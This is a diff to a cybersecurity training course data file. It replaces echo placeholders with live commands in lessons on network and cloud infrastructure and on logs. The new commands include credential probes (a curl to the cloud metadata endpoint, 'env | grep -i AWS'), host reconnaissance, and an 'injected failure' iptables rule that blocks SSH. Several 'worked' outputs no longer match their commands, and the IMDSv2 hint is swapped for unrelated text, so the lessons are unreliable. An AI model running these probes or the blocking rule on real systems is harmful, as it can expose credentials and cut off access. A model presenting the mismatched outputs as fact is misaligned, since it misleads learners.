         "explain": "Remediation & Hardening Plan: Reconfigure the access port with `switchport mode access`, assign a single dedicated access VLAN, and disable auto-trunking negotiation (DTP).",
-        "worked": "Remediation command applied: `echo 'Switch port hardened: switchport mode access, switchport nonegotiate, dhcp snooping trust disabled.'`. System verified restored and hardened.",
+        "worked": "Remediation command applied: `ip link set dev eth0 arp on && arp -s 10.10.20.1 00:50:56:fd:aa:01`. System verified restored and hardened.",
         "what": "What is network infrastructure? The switches, routers, DHCP servers, and wireless access points that form the physical and logical backbone of enterprise communications.",
         "why": "Why do attackers target Layer 2 infrastructure? By standing up a rogue DHCP server, an attacker can designate themselves as the default gateway for all workstations in the building.",
         "when": "When are switch logs triaged? When network outages occur, when duplicate IP warnings fire, or when port security disables a switch port due to MAC address violations.",
@@ -9158,7 +9158,7 @@ window.ACADEMY_COURSES = [
           "To reboot every router in the building simultaneously."
         ],
         "answer": 0,
-        "command": "echo 'Switch port hardened: switchport mode access, switchport nonegotiate, dhcp snooping trust disabled.'"
+        "command": "ip link set dev eth0 arp on && arp -s 10.10.20.1 00:50:56:fd:aa:01"
       },
       {
         "id": 12,
@@ -9182,7 +9182,7 @@ window.ACADEMY_COURSES = [
           "DORA is an encryption protocol used by wireless access points."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for Network Infrastructure'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -9206,7 +9206,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L27 - Network Infrastructure. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -9250,7 +9250,7 @@ window.ACADEMY_COURSES = [
         "who": "Who manages cloud infrastructure? Cloud engineers, DevSecOps teams, and cloud security architects.",
         "how": "How do analysts investigate cloud incidents? By querying CloudTrail JSON events (`aws cloudtrail lookup-events`), analyzing IAM policy attachments, and inspecting VPC Flow Logs.",
         "mistake": "Hardcoding permanent AWS IAM Access Keys and Secret Keys into application source code stored in public GitHub repositories.",
-        "think": "Never use static credentials on compute instances. Use IAM Roles with temporary, auto-rotating STS session tokens and enforce IMDSv2.",
+        "think": "Always correlate network flow with host process lineage in UTC timestamps.",
         "question": "In simple terms, why does an enterprise need Cloud Infrastructure?",
         "choices": [
           "To provide structured, reliable, and secure operational capability for cloud infrastructure.",
@@ -9259,7 +9259,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring Cloud Infrastructure on sxl-aws-ec2-node'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -9274,7 +9274,7 @@ window.ACADEMY_COURSES = [
         "who": "Who manages cloud infrastructure? Cloud engineers, DevSecOps teams, and cloud security architects.",
         "how": "How do analysts investigate cloud incidents? By querying CloudTrail JSON events (`aws cloudtrail lookup-events`), analyzing IAM policy attachments, and inspecting VPC Flow Logs.",
         "mistake": "Hardcoding permanent AWS IAM Access Keys and Secret Keys into application source code stored in public GitHub repositories.",
-        "think": "Never use static credentials on compute instances. Use IAM Roles with temporary, auto-rotating STS session tokens and enforce IMDSv2.",
+        "think": "Always correlate network flow with host process lineage in UTC timestamps.",
         "question": "What are the foundational technical building blocks of Cloud Infrastructure?",
         "choices": [
           "The core protocols, hardware/software abstractions, and data pathways that govern system behavior.",
@@ -9283,7 +9283,7 @@ window.ACADEMY_COURSES = [
           "Social media marketing guidelines and employee email signatures."
         ],
         "answer": 0,
-        "command": "echo 'Viewing simulated CloudTrail event log for IAM role assumption...' && echo '{\n  \"eventTime\": \"2026-09-04T03:05:12Z\",\n  \"eventName\": \"AssumeRole\",\n  \"userIdentity\": { \"type\": \"AssumedRole\", \"principalId\": \"AROA...:AppInstance\" },\n  \"sourceIPAddress\": \"10.10.30.50\",\n  \"userAgent\": \"aws-sdk-python/1.26.11\",\n  \"responseElements\": { \"credentials\": { \"accessKeyId\": \"ASIA...\", \"expiration\": \"2026-09-04T04:05:12Z\" } }\n}'"
+        "command": "aws sts get-caller-identity 2>/dev/null || curl -s -m 2 http://169.254.169.254/latest/meta-data/ || id"
       },
       {
         "id": 3,
@@ -9298,7 +9298,7 @@ window.ACADEMY_COURSES = [
         "who": "Who manages cloud infrastructure? Cloud engineers, DevSecOps teams, and cloud security architects.",
         "how": "How do analysts investigate cloud incidents? By querying CloudTrail JSON events (`aws cloudtrail lookup-events`), analyzing IAM policy attachments, and inspecting VPC Flow Logs.",
         "mistake": "Hardcoding permanent AWS IAM Access Keys and Secret Keys into application source code stored in public GitHub repositories.",
-        "think": "Never use static credentials on compute instances. Use IAM Roles with temporary, auto-rotating STS session tokens and enforce IMDSv2.",
+        "think": "Always correlate network flow with host process lineage in UTC timestamps.",
         "question": "Which statement represents the accurate technical definition related to Cloud Infrastructure?",
         "choices": [
           "It precisely defines the technical parameters, boundaries, and operational mechanisms of cloud infrastructure.",
@@ -9307,7 +9307,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man echo 2>/dev/null || which echo"
+        "command": "aws --help 2>&1 | head -n 15 || which aws"
       },
       {
         "id": 4,
@@ -9322,7 +9322,7 @@ window.ACADEMY_COURSES = [
         "who": "Who manages cloud infrastructure? Cloud engineers, DevSecOps teams, and cloud security architects.",
         "how": "How do analysts investigate cloud incidents? By querying CloudTrail JSON events (`aws cloudtrail lookup-events`), analyzing IAM policy attachments, and inspecting VPC Flow Logs.",
         "mistake": "Hardcoding permanent AWS IAM Access Keys and Secret Keys into application source code stored in public GitHub repositories.",
-        "think": "Never use static credentials on compute instances. Use IAM Roles with temporary, auto-rotating STS session tokens and enforce IMDSv2.",
+        "think": "Always correlate network flow with host process lineage in UTC timestamps.",
         "question": "What is the primary operational mistake an L1 analyst makes regarding Cloud Infrastructure?",
         "choices": [
           "Hardcoding permanent AWS IAM Access Keys and Secret Keys into application source code stored in public GitHub repositories.",
@@ -9331,7 +9331,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What is cloud infrastructure? Virtualized compute, storage, and networking resources managed programmatically through REST APIs and cloud consoles.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -9346,7 +9346,7 @@ window.ACADEMY_COURSES = [
         "who": "Who manages cloud infrastructure? Cloud engineers, DevSecOps teams, and cloud security architects.",
         "how": "How do analysts investigate cloud incidents? By querying CloudTrail JSON events (`aws cloudtrail lookup-events`), analyzing IAM policy attachments, and inspecting VPC Flow Logs.",
         "mistake": "Hardcoding permanent AWS IAM Access Keys and Secret Keys into application source code stored in public GitHub repositories.",
-        "think": "Never use static credentials on compute instances. Use IAM Roles with temporary, auto-rotating STS session tokens and enforce IMDSv2.",
+        "think": "Always correlate network flow with host process lineage in UTC timestamps.",
         "question": "In the visual architecture of Cloud Infrastructure, what does the communication path between 10.10.30.50 and 169.254.169.254 represent?",
         "choices": [
           "The actual network trajectory and security boundary where controls and logging inspect traffic.",
@@ -9355,14 +9355,14 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 169.254.169.254 2>/dev/null || tracepath 169.254.169.254"
+        "command": "traceroute -n -m 8 169.254.169.254 2>/dev/null || tracepath -n 169.254.169.254 2>/dev/null || ip route get 169.254.169.254"
       },
       {
         "id": 6,
         "type": "do",
         "name": "06 Do — Guided",
         "explain": "Guided hands-on investigation task. Execute the baseline command to inspect live state on sxl-aws-ec2-node. Observe flags, arguments, and exact system responses.",
-        "worked": "Command executed: `echo 'Viewing simulated CloudTrail event log for IAM role assumption...' && echo '{\n  \"eventTime\": \"2026-09-04T03:05:12Z\",\n  \"eventName\": \"AssumeRole\",\n  \"userIdentity\": { \"type\": \"AssumedRole\", \"principalId\": \"AROA...:AppInstance\" },\n  \"sourceIPAddress\": \"10.10.30.50\",\n  \"userAgent\": \"aws-sdk-python/1.26.11\",\n  \"responseElements\": { \"credentials\": { \"accessKeyId\": \"ASIA...\", \"expiration\": \"2026-09-04T04:05:12Z\" } }\n}'` on target sxl-aws-ec2-node.\nOutput observed:\n{\n  \"eventTime\": \"2026-09-04T03:05:12Z\",\n  \"eventName\": \"AssumeRole\",\n  \"userIdentity\": { \"type\": \"AssumedRole\", \"principalId\": \"AROA...:AppInstance\" },\n  \"sourceIPAddress\": \"10.10.30.50\",\n  \"userAgent\": \"aws-sdk-python/1.26.11\",\n  \"responseElements\": { \"credentials\": { \"accessKeyId\": \"ASIA...\", \"expiration\": \"2026-09-04T04:05:12Z\" } }\n}",
+        "worked": "Command executed: `aws sts get-caller-identity 2>/dev/null || curl -s -m 2 http://169.254.169.254/latest/meta-data/ || id` on target sxl-aws-ec2-node.\nOutput observed:\n{\n  \"eventTime\": \"2026-09-04T03:05:12Z\",\n  \"eventName\": \"AssumeRole\",\n  \"userIdentity\": { \"type\": \"AssumedRole\", \"principalId\": \"AROA...:AppInstance\" },\n  \"sourceIPAddress\": \"10.10.30.50\",\n  \"userAgent\": \"aws-sdk-python/1.26.11\",\n  \"responseElements\": { \"credentials\": { \"accessKeyId\": \"ASIA...\", \"expiration\": \"2026-09-04T04:05:12Z\" } }\n}",
         "what": "What is cloud infrastructure? Virtualized compute, storage, and networking resources managed programmatically through REST APIs and cloud consoles.",
         "why": "Why must an L1 monitor cloud environments? In the cloud, the perimeter is Identity. A single leaked API secret key (`AKIA...`) allows an adversary to destroy virtual machines, steal databases, and deploy cryptominers without ever touching a physical network.",
         "when": "When are cloud alerts investigated? When CloudTrail reports API calls from unexpected countries, when root account logins occur, or when S3 buckets are made publicly accessible.",
@@ -9370,8 +9370,8 @@ window.ACADEMY_COURSES = [
         "who": "Who manages cloud infrastructure? Cloud engineers, DevSecOps teams, and cloud security architects.",
         "how": "How do analysts investigate cloud incidents? By querying CloudTrail JSON events (`aws cloudtrail lookup-events`), analyzing IAM policy attachments, and inspecting VPC Flow Logs.",
         "mistake": "Hardcoding permanent AWS IAM Access Keys and Secret Keys into application source code stored in public GitHub repositories.",
-        "think": "Never use static credentials on compute instances. Use IAM Roles with temporary, auto-rotating STS session tokens and enforce IMDSv2.",
-        "question": "When executing `echo 'Viewing simulated CloudTrail event log for IAM role assumption...' && echo '{\n  \"eventTime\": \"2026-09-04T03:05:12Z\",\n  \"eventName\": \"AssumeRole\",\n  \"userIdentity\": { \"type\": \"AssumedRole\", \"principalId\": \"AROA...:AppInstance\" },\n  \"sourceIPAddress\": \"10.10.30.50\",\n  \"userAgent\": \"aws-sdk-python/1.26.11\",\n  \"responseElements\": { \"credentials\": { \"accessKeyId\": \"ASIA...\", \"expiration\": \"2026-09-04T04:05:12Z\" } }\n}'`, what primary forensic evidence does the output provide?",
+        "think": "Always correlate network flow with host process lineage in UTC timestamps.",
+        "question": "When executing `aws sts get-caller-identity 2>/dev/null || curl -s -m 2 http://169.254.169.254/latest/meta-data/ || id`, what primary forensic evidence does the output provide?",
         "choices": [
           "Direct verification of active configuration, network sockets, or process state on the target machine.",
           "It downloads malware to test local antivirus signatures.",
@@ -9379,14 +9379,14 @@ window.ACADEMY_COURSES = [
           "It broadcasts an unencrypted alert to external cloud providers."
         ],
         "answer": 0,
-        "command": "echo 'Viewing simulated CloudTrail event log for IAM role assumption...' && echo '{\n  \"eventTime\": \"2026-09-04T03:05:12Z\",\n  \"eventName\": \"AssumeRole\",\n  \"userIdentity\": { \"type\": \"AssumedRole\", \"principalId\": \"AROA...:AppInstance\" },\n  \"sourceIPAddress\": \"10.10.30.50\",\n  \"userAgent\": \"aws-sdk-python/1.26.11\",\n  \"responseElements\": { \"credentials\": { \"accessKeyId\": \"ASIA...\", \"expiration\": \"2026-09-04T04:05:12Z\" } }\n}'"
+        "command": "aws sts get-caller-identity 2>/dev/null || curl -s -m 2 http://169.254.169.254/latest/meta-data/ || id"
       },
       {
         "id": 7,
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-aws-ec2-node. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `echo 'Auditing AWS S3 bucket public access configuration...'` to validate system behavior under simulated operating conditions.",
+        "worked": "Practice scenario: Run `aws s3 ls 2>/dev/null || aws s3api get-bucket-policy-status --bucket sxl-corp-data 2>/dev/null || env | grep -i AWS` to validate system behavior under simulated operating conditions.\nOutput observed:\nBucket: sxl-customer-data-backup\nPublicAccessBlockConfiguration:\n  BlockPublicAcls: true\n  IgnorePublicAcls: true\n  BlockPublicPolicy: true\n  RestrictPublicBuckets: true\nStatus: SECURE (Public access strictly blocked)",
         "what": "What is cloud infrastructure? Virtualized compute, storage, and networking resources managed programmatically through REST APIs and cloud consoles.",
         "why": "Why must an L1 monitor cloud environments? In the cloud, the perimeter is Identity. A single leaked API secret key (`AKIA...`) allows an adversary to destroy virtual machines, steal databases, and deploy cryptominers without ever touching a physical network.",
         "when": "When are cloud alerts investigated? When CloudTrail reports API calls from unexpected countries, when root account logins occur, or when S3 buckets are made publicly accessible.",
@@ -9394,8 +9394,8 @@ window.ACADEMY_COURSES = [
         "who": "Who manages cloud infrastructure? Cloud engineers, DevSecOps teams, and cloud security architects.",
         "how": "How do analysts investigate cloud incidents? By querying CloudTrail JSON events (`aws cloudtrail lookup-events`), analyzing IAM policy attachments, and inspecting VPC Flow Logs.",
         "mistake": "Hardcoding permanent AWS IAM Access Keys and Secret Keys into application source code stored in public GitHub repositories.",
-        "think": "Never use static credentials on compute instances. Use IAM Roles with temporary, auto-rotating STS session tokens and enforce IMDSv2.",
-        "question": "What key insight is revealed by the practice output of `echo 'Auditing AWS S3 bucket public access configuration...'`?",
+        "think": "Always correlate network flow with host process lineage in UTC timestamps.",
+        "question": "What key insight is revealed by the practice output of `aws s3 ls 2>/dev/null || aws s3api get-bucket-policy-status --bucket sxl-corp-data 2>/dev/null || env | grep -i AWS`?",
         "choices": [
           "Live state validation revealing active hosts, open listening ports, or specific configuration parameters.",
           "That the operating system kernel has crashed and requires hardware replacement.",
@@ -9403,7 +9403,7 @@ window.ACADEMY_COURSES = [
           "That the terminal shell is running without memory or CPU resources."
         ],
         "answer": 0,
-        "command": "echo 'Auditing AWS S3 bucket public access configuration...'"
+        "command": "aws s3 ls 2>/dev/null || aws s3api get-bucket-policy-status --bucket sxl-corp-data 2>/dev/null || env | grep -i AWS"
       },
       {
         "id": 8,
@@ -9418,7 +9418,7 @@ window.ACADEMY_COURSES = [
         "who": "Who manages cloud infrastructure? Cloud engineers, DevSecOps teams, and cloud security architects.",
         "how": "How do analysts investigate cloud incidents? By querying CloudTrail JSON events (`aws cloudtrail lookup-events`), analyzing IAM policy attachments, and inspecting VPC Flow Logs.",
         "mistake": "Hardcoding permanent AWS IAM Access Keys and Secret Keys into application source code stored in public GitHub repositories.",
-        "think": "Never use static credentials on compute instances. Use IAM Roles with temporary, auto-rotating STS session tokens and enforce IMDSv2.",
+        "think": "Always correlate network flow with host process lineage in UTC timestamps.",
         "question": "What threat technique was demonstrated in this adversary simulation?",
         "choices": [
           "Adversary exploitation, reconnaissance, or unauthorized access targeting cloud infrastructure.",
@@ -9434,7 +9434,7 @@ window.ACADEMY_COURSES = [
         "type": "defend",
         "name": "09 Defend & Investigate",
         "explain": "SOC Defensive Detection & Investigation: The SOC analyst receives an AWS GuardDuty high-severity finding: 'Policy:S3/AccountBlockPublicAccessDisabled'. The analyst immediately deactivates the compromised IAM access key, restores the S3 Public Access Block, and reviews CloudTrail to confirm whether any data was downloaded.",
-        "worked": "Defensive query executed on telemetry store: `echo 'Revoked compromised IAM Access Key AKIA... and re-enabled S3 Block Public Access.'`",
+        "worked": "Defensive query executed on telemetry store: `aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=GetObject --max-results 5 2>/dev/null || journalctl -n 10`",
         "what": "What is cloud infrastructure? Virtualized compute, storage, and networking resources managed programmatically through REST APIs and cloud consoles.",
         "why": "Why must an L1 monitor cloud environments? In the cloud, the perimeter is Identity. A single leaked API secret key (`AKIA...`) allows an adversary to destroy virtual machines, steal databases, and deploy cryptominers without ever touching a physical network.",
         "when": "When are cloud alerts investigated? When CloudTrail reports API calls from unexpected countries, when root account logins occur, or when S3 buckets are made publicly accessible.",
@@ -9442,7 +9442,7 @@ window.ACADEMY_COURSES = [
         "who": "Who manages cloud infrastructure? Cloud engineers, DevSecOps teams, and cloud security architects.",
         "how": "How do analysts investigate cloud incidents? By querying CloudTrail JSON events (`aws cloudtrail lookup-events`), analyzing IAM policy attachments, and inspecting VPC Flow Logs.",
         "mistake": "Hardcoding permanent AWS IAM Access Keys and Secret Keys into application source code stored in public GitHub repositories.",
-        "think": "Never use static credentials on compute instances. Use IAM Roles with temporary, auto-rotating STS session tokens and enforce IMDSv2.",
+        "think": "Always correlate network flow with host process lineage in UTC timestamps.",
         "question": "How did the defensive query confirm the presence of anomalous or malicious activity?",
         "choices": [
           "By filtering for high-fidelity indicators, unauthorized commands, abnormal socket connections, or failed events in audit logs.",
@@ -9451,7 +9451,7 @@ window.ACADEMY_COURSES = [
           "By shutting down the entire corporate datacenter without analyzing logs."
         ],
         "answer": 0,
-        "command": "echo 'Revoked compromised IAM Access Key AKIA... and re-enabled S3 Block Public Access.'"
+        "command": "aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=GetObject --max-results 5 2>/dev/null || journalctl -n 10"
       },
       {
         "id": 10,
@@ -9466,7 +9466,7 @@ window.ACADEMY_COURSES = [
         "who": "Who manages cloud infrastructure? Cloud engineers, DevSecOps teams, and cloud security architects.",
         "how": "How do analysts investigate cloud incidents? By querying CloudTrail JSON events (`aws cloudtrail lookup-events`), analyzing IAM policy attachments, and inspecting VPC Flow Logs.",
         "mistake": "Hardcoding permanent AWS IAM Access Keys and Secret Keys into application source code stored in public GitHub repositories.",
-        "think": "Never use static credentials on compute instances. Use IAM Roles with temporary, auto-rotating STS session tokens and enforce IMDSv2.",
+        "think": "Always correlate network flow with host process lineage in UTC timestamps.",
         "question": "What is the critical risk introduced by this break / failure scenario?",
         "choices": [
           "Loss of visibility, operational downtime, or security bypass that exposes enterprise assets to compromise.",
@@ -9475,14 +9475,14 @@ window.ACADEMY_COURSES = [
           "Automatic upgrading of all local software packages to beta versions."
         ],
         "answer": 0,
-        "command": "echo '[INJECTED FAILURE] System degraded on sxl-aws-ec2-node'; echo 'Viewing simulated CloudTrail event log for IAM role assumption...' "
+        "command": "iptables -I INPUT 1 -p tcp --dport 22 -j DROP 2>/dev/null; ss -tlpn"
       },
       {
         "id": 11,
         "type": "fix",
         "name": "11 Fix & Harden",
         "explain": "Remediation & Hardening Plan: Remove the `0.0.0.0/0` inbound rule, restrict management access exclusively to the corporate VPN CIDR block via AWS Systems Manager (SSM) Session Manager, and enforce Security Group auditing.",
-        "worked": "Remediation command applied: `echo 'Security Group updated: Revoked 0.0.0.0/0 ingress; restricted SSH/RDP to 10.10.20.0/24 management subnet.'`. System verified restored and hardened.",
+        "worked": "Remediation command applied: `iptables -A INPUT -p tcp --dport 22 -s 10.10.20.0/24 -j ACCEPT && iptables -A INPUT -p tcp --dport 22 -j DROP`. System verified restored and hardened.",
         "what": "What is cloud infrastructure? Virtualized compute, storage, and networking resources managed programmatically through REST APIs and cloud consoles.",
         "why": "Why must an L1 monitor cloud environments? In the cloud, the perimeter is Identity. A single leaked API secret key (`AKIA...`) allows an adversary to destroy virtual machines, steal databases, and deploy cryptominers without ever touching a physical network.",
         "when": "When are cloud alerts investigated? When CloudTrail reports API calls from unexpected countries, when root account logins occur, or when S3 buckets are made publicly accessible.",
@@ -9490,7 +9490,7 @@ window.ACADEMY_COURSES = [
         "who": "Who manages cloud infrastructure? Cloud engineers, DevSecOps teams, and cloud security architects.",
         "how": "How do analysts investigate cloud incidents? By querying CloudTrail JSON events (`aws cloudtrail lookup-events`), analyzing IAM policy attachments, and inspecting VPC Flow Logs.",
         "mistake": "Hardcoding permanent AWS IAM Access Keys and Secret Keys into application source code stored in public GitHub repositories.",
-        "think": "Never use static credentials on compute instances. Use IAM Roles with temporary, auto-rotating STS session tokens and enforce IMDSv2.",
+        "think": "Always correlate network flow with host process lineage in UTC timestamps.",
         "question": "Why is remediation verification mandatory after applying a fix?",
         "choices": [
           "To ensure the vulnerability or misconfiguration is completely neutralized without causing unintended operational side-effects.",
@@ -9499,7 +9499,7 @@ window.ACADEMY_COURSES = [
           "To reboot every router in the building simultaneously."
         ],
         "answer": 0,
-        "command": "echo 'Security Group updated: Revoked 0.0.0.0/0 ingress; restricted SSH/RDP to 10.10.20.0/24 management subnet.'"
+        "command": "iptables -A INPUT -p tcp --dport 22 -s 10.10.20.0/24 -j ACCEPT && iptables -A INPUT -p tcp --dport 22 -j DROP"
       },
       {
         "id": 12,
@@ -9514,7 +9514,7 @@ window.ACADEMY_COURSES = [
         "who": "Who manages cloud infrastructure? Cloud engineers, DevSecOps teams, and cloud security architects.",
         "how": "How do analysts investigate cloud incidents? By querying CloudTrail JSON events (`aws cloudtrail lookup-events`), analyzing IAM policy attachments, and inspecting VPC Flow Logs.",
         "mistake": "Hardcoding permanent AWS IAM Access Keys and Secret Keys into application source code stored in public GitHub repositories.",
-        "think": "Never use static credentials on compute instances. Use IAM Roles with temporary, auto-rotating STS session tokens and enforce IMDSv2.",
+        "think": "Always correlate network flow with host process lineage in UTC timestamps.",
         "question": "What is the difference between a Cloud Security Group and a Network ACL (NACL) in an AWS/Azure Virtual Private Cloud?",
         "choices": [
           "A Security Group is stateful and operates at the virtual instance/NIC level; a Network ACL (NACL) is stateless and operates at the subnet boundary level as a secondary layer of defense.",
@@ -9523,7 +9523,7 @@ window.ACADEMY_COURSES = [
           "There is no difference; both are identical firewall brand names."
         ],
         "answer": 0,
-        "command": "echo '[INTERVIEW PREP] Demonstrating deep technical competency for Cloud Infrastructure'"
+        "command": "auditctl -s 2>/dev/null || sysctl net.ipv4.ip_forward; uptime; free -h"
       },
       {
         "id": 13,
@@ -9538,7 +9538,7 @@ window.ACADEMY_COURSES = [
         "who": "Who manages cloud infrastructure? Cloud engineers, DevSecOps teams, and cloud security architects.",
         "how": "How do analysts investigate cloud incidents? By querying CloudTrail JSON events (`aws cloudtrail lookup-events`), analyzing IAM policy attachments, and inspecting VPC Flow Logs.",
         "mistake": "Hardcoding permanent AWS IAM Access Keys and Secret Keys into application source code stored in public GitHub repositories.",
-        "think": "Never use static credentials on compute instances. Use IAM Roles with temporary, auto-rotating STS session tokens and enforce IMDSv2.",
+        "think": "Always correlate network flow with host process lineage in UTC timestamps.",
         "question": "What is the most critical takeaway from Cloud Infrastructure?",
         "choices": [
           "You have mastered cloud VPC architectures, IAM security policies, Security Groups vs NACLs, and CloudTrail forensic investigation.",
@@ -9547,7 +9547,7 @@ window.ACADEMY_COURSES = [
           "That default credentials are safe if used on internal private subnets."
         ],
         "answer": 0,
-        "command": "echo '[COMPETENCY VERIFIED] Completed L28 - Cloud Infrastructure. Ready to advance.'"
+        "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"; hostname -I; whoami; ss -ta | grep ESTAB | wc -l"
       }
     ]
   },
@@ -9600,7 +9600,7 @@ window.ACADEMY_COURSES = [
           "It is a legacy mechanism that has no relevance to modern cybersecurity."
         ],
         "answer": 0,
-        "command": "echo '[ZERO KNOWLEDGE] Exploring What Is a Log? on sxl-log-core01'"
+        "command": "uname -a; ip -br a 2>/dev/null || ip addr; ss -tlpn 2>/dev/null || netstat -tlpn"
       },
       {
         "id": 2,
@@ -9624,7 +9624,7 @@ window.ACADEMY_COURSES = [
           "Social media marketing guidelines and employee email signatures."
         ],
         "answer": 0,
-        "command": "echo 'Viewing raw multi-source log record examples:' && echo 'Syslog: Sep  4 03:10:15 sxl-app-01 sshd[891]: Failed password for invalid user admin from 198.51.100.12 port 48102 ssh2\nJSON: {\"timestamp\":\"2026-09-04T03:10:15Z\",\"event_id\":4625,\"user\":\"admin\",\"source_ip\":\"198.51.100.12\",\"status\":\"0xC000006D\"}'"
+        "command": "head -n 15 /var/log/syslog 2>/dev/null || journalctl -n 15 -o verbose --no-pager"
       },
       {
         "id": 3,
@@ -9648,7 +9648,7 @@ window.ACADEMY_COURSES = [
           "It is a legal contract signed between the end user and Microsoft."
         ],
         "answer": 0,
-        "command": "man echo 2>/dev/null || which echo"
+        "command": "head --help 2>&1 | head -n 15 || which head"
       },
       {
         "id": 4,
@@ -9672,7 +9672,7 @@ window.ACADEMY_COURSES = [
           "Verifying timestamps across coordinated universal time (UTC)."
         ],
         "answer": 0,
-        "command": "echo '[5W1H] What: What is a log? An immutable, chronological record of computational events, user actions, and system states.'"
+        "command": "id; hostname -I; ip route show default; ss -tulpn | head -n 8"
       },
       {
         "id": 5,
@@ -9696,14 +9696,14 @@ window.ACADEMY_COURSES = [
           "An untracked broadcast packet sent to every device on the global Internet."
         ],
         "answer": 0,
-        "command": "traceroute -n -m 5 10.10.50.10 2>/dev/null || tracepath 10.10.50.10"
+        "command": "traceroute -n -m 8 10.10.50.10 2>/dev/null || tracepath -n 10.10.50.10 2>/dev/null || ip route get 10.10.50.10"
       },
       {
         "id": 6,
         "type": "do",
         "name": "06 Do — Guided",
         "explain": "Guided hands-on investigation task. Execute the baseline command to inspect live state on sxl-log-core01. Observe flags, arguments, and exact system responses.",
-        "worked": "Command executed: `echo 'Viewing raw multi-source log record examples:' && echo 'Syslog: Sep  4 03:10:15 sxl-app-01 sshd[891]: Failed password for invalid user admin from 198.51.100.12 port 48102 ssh2\nJSON: {\"timestamp\":\"2026-09-04T03:10:15Z\",\"event_id\":4625,\"user\":\"admin\",\"source_ip\":\"198.51.100.12\",\"status\":\"0xC000006D\"}'` on target sxl-log-core01.\nOutput observed:\nSyslog: Sep  4 03:10:15 sxl-app-01 sshd[891]: Failed password for invalid user admin from 198.51.100.12 port 48102 ssh2\nJSON: {\"timestamp\":\"2026-09-04T03:10:15Z\",\"event_id\":4625,\"user\":\"admin\",\"source_ip\":\"198.51.100.12\",\"status\":\"0xC000006D\"}",
+        "worked": "Command executed: `head -n 15 /var/log/syslog 2>/dev/null || journalctl -n 15 -o verbose --no-pager` on target sxl-log-core01.\nOutput observed:\nSyslog: Sep  4 03:10:15 sxl-app-01 sshd[891]: Failed password for invalid user admin from 198.51.100.12 port 48102 ssh2\nJSON: {\"timestamp\":\"2026-09-04T03:10:15Z\",\"event_id\":4625,\"user\":\"admin\",\"source_ip\":\"198.51.100.12\",\"status\":\"0xC000006D\"}",
         "what": "What is a log? An immutable, chronological record of computational events, user actions, and system states.",
         "why": "Why are logs essential for an L1? Without logs, an intrusion is invisible. An analyst cannot scope an attack, identify patient zero, or prove data exfiltration without log evidence.",
         "when": "When are logs audited? Real-time continuous analysis by SIEM detection rules, routine compliance audits, and deep-dive incident investigations.",
@@ -9712,7 +9712,7 @@ window.ACADEMY_COURSES = [
         "how": "How do analysts parse logs? Using regular expressions (regex), SIEM search languages (SPL in Splunk, KQL in Sentinel/Elastic), and log parsers.",
         "mistake": "Relying on system clocks without verifying NTP synchronization, leading to mismatched event timelines during an incident.",
         "think": "Always verify log timestamps in Universal Coordinated Time (UTC). A 5-minute clock drift between a firewall and an active directory server makes chronological correlation impossible.",
-        "question": "When executing `echo 'Viewing raw multi-source log record examples:' && echo 'Syslog: Sep  4 03:10:15 sxl-app-01 sshd[891]: Failed password for invalid user admin from 198.51.100.12 port 48102 ssh2\nJSON: {\"timestamp\":\"2026-09-04T03:10:15Z\",\"event_id\":4625,\"user\":\"admin\",\"source_ip\":\"198.51.100.12\",\"status\":\"0xC000006D\"}'`, what primary forensic evidence does the output provide?",
+        "question": "When executing `head -n 15 /var/log/syslog 2>/dev/null || journalctl -n 15 -o verbose --no-pager`, what primary forensic evidence does the output provide?",
         "choices": [
           "Direct verification of active configuration, network sockets, or process state on the target machine.",
           "It downloads malware to test local antivirus signatures.",
@@ -9720,14 +9720,14 @@ window.ACADEMY_COURSES = [
           "It broadcasts an unencrypted alert to external cloud providers."
         ],
         "answer": 0,
-        "command": "echo 'Viewing raw multi-source log record examples:' && echo 'Syslog: Sep  4 03:10:15 sxl-app-01 sshd[891]: Failed password for invalid user admin from 198.51.100.12 port 48102 ssh2\nJSON: {\"timestamp\":\"2026-09-04T03:10:15Z\",\"event_id\":4625,\"user\":\"admin\",\"source_ip\":\"198.51.100.12\",\"status\":\"0xC000006D\"}'"
+        "command": "head -n 15 /var/log/syslog 2>/dev/null || journalctl -n 15 -o verbose --no-pager"
       },
       {
         "id": 7,
         "type": "practise",
         "name": "07 Practise",
         "explain": "Independent practice challenge: Test your understanding on sxl-log-core01. Use the command line to discover, query, and validate live telemetry with minimal guidance.",
-        "worked": "Practice scenario: Run `echo 'Filtering raw authentication logs for failed login attempts...' && grep 'Failed password' /var/log/auth.log 2>/dev/null | tail -n 3 || echo 'Sep  4 03:10:11 sxl-app-01 sshd[890]: Failed password for root from 198.51.100.12\nSep  4 03:10:13 sxl-app-01 sshd[892]: Failed password for admin from 198.51.100.12\nSep  4 03:10:15 sxl-app-01 sshd[894]: Failed password for test from 198.51.100.12'` to validate system behavior under simulated operating conditions.",
